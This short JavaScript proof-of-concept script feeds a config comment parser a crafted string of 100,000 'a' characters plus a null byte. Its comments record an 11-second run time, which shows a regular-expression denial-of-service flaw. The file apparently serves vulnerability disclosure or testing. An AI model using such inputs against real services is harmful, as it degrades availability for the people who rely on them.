const ConfigCommentParser = require("./config-comment-parser.js");

//Attack String :""+"a"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "\u0000";

var parser = new ConfigCommentParser();
console.log(parser.parseJsonConfig(str));


// real    0m11.038s
// user    0m10.854s
// sys     0m0.010s